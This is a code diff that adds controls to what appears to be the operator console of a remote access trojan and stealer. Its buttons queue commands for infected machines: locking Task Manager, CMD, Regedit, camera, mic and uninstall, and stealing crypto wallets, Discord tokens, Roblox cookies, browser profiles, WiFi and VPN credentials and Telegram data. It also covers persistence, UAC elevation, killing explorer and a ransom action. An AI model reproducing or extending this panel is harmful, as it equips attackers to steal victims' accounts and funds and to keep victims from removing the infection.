@@ -344,7 +344,53 @@
             </div>
           </div>
           <div class="panel" id="panel-an-stealer">
-            <div class="panel-title">Stealer</div>
+            
+      <div class="card" id="perm-locks" style="padding:14px;border:1px solid var(--border);border-radius:12px;margin-bottom:12px">
+        <div class="panel-title">Permission locks (PetShift Auth / RAT)</div>
+        <div class="panel-desc">toggle host policies — agent applies on next beacon</div>
+        <div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:10px">
+          <button class="cmd sm" type="button" onclick="lockPerm('taskmgr',true)">Lock TaskMgr</button>
+          <button class="cmd sm" type="button" onclick="lockPerm('taskmgr',false)">Unlock TaskMgr</button>
+          <button class="cmd sm" type="button" onclick="lockPerm('cmd',true)">Lock CMD</button>
+          <button class="cmd sm" type="button" onclick="lockPerm('cmd',false)">Unlock CMD</button>
+          <button class="cmd sm" type="button" onclick="lockPerm('regedit',true)">Lock Regedit</button>
+          <button class="cmd sm" type="button" onclick="lockPerm('regedit',false)">Unlock Regedit</button>
+          <button class="cmd sm" type="button" onclick="lockPerm('camera',true)">Lock Camera</button>
+          <button class="cmd sm" type="button" onclick="lockPerm('camera',false)">Unlock Camera</button>
+          <button class="cmd sm" type="button" onclick="lockPerm('microphone',true)">Lock Mic</button>
+          <button class="cmd sm" type="button" onclick="lockPerm('microphone',false)">Unlock Mic</button>
+          <button class="cmd sm" type="button" onclick="lockPerm('uninstall',true)">Lock Uninstall</button>
+          <button class="cmd sm" type="button" onclick="lockPerm('uninstall',false)">Unlock Uninstall</button>
+          <button class="cmd sm" type="button" onclick="lockPerm('settings',true)">Lock Settings</button>
+          <button class="cmd sm" type="button" onclick="lockPerm('settings',false)">Unlock Settings</button>
+          <button class="cmd primary sm" type="button" onclick="lockAll(true)">Lock ALL</button>
+          <button class="cmd sm" type="button" onclick="send('hide_start')">Hide Win keys / Start bits</button>
+          <button class="cmd sm" type="button" onclick="send('hide_shutdown')">Hide shutdown</button>
+          <button class="cmd sm" type="button" onclick="send('disable_taskmgr')">Disable TaskMgr</button>
+          <button class="cmd sm" type="button" onclick="send('enable_taskmgr')">Enable TaskMgr</button>
+          <button class="cmd sm" type="button" onclick="lockAll(false)">Unlock ALL</button>
+        </div>
+        <div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:12px">
+          <button class="cmd" type="button" onclick="send('steal')">Full steal</button>
+          <button class="cmd" type="button" onclick="send('steal_wallets')">Wallets / seeds</button>
+          <button class="cmd" type="button" onclick="send('steal_discord')">Discord tokens</button>
+          <button class="cmd" type="button" onclick="send('steal_roblox')">Roblox cookies</button>
+          <button class="cmd" type="button" onclick="send('steal_browsers')">Browser profiles</button>
+          <button class="cmd" type="button" onclick="send('steal_wifi')">WiFi passwords</button>
+          <button class="cmd" type="button" onclick="send('steal_vpn')">VPN configs</button>
+          <button class="cmd" type="button" onclick="send('steal_games')">Steam/Epic/Riot</button>
+          <button class="cmd" type="button" onclick="send('steal_telegram')">Telegram tdata</button>
+          <button class="cmd" type="button" onclick="send('file_hunter')">File hunter</button>
+          <button class="cmd" type="button" onclick="send('watchdog')">Watchdog</button>
+          <button class="cmd" type="button" onclick="send('uac_elevate')">UAC elevate (manual)</button>
+          <button class="cmd danger" type="button" onclick="if(confirm('Rename files in PetShift_Lock_Test only?'))send('ransom_on')">Ransom test folder</button>
+          <button class="cmd" type="button" onclick="send('persist')">Re-persist</button>
+          <button class="cmd danger" type="button" onclick="send('bsod_attempt')">Kill explorer</button>
+          <button class="cmd" type="button" onclick="send('restore_explorer')">Restore explorer</button>
+        </div>
+      </div>
+
+        <div class="panel-title">Stealer</div>
             <div class="panel-desc">queue pulls — device runs them on next beacon</div>
             <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px">
               <button class="cmd" type="button" data-an-cmd="steal_notifs">Notifications dump</button>
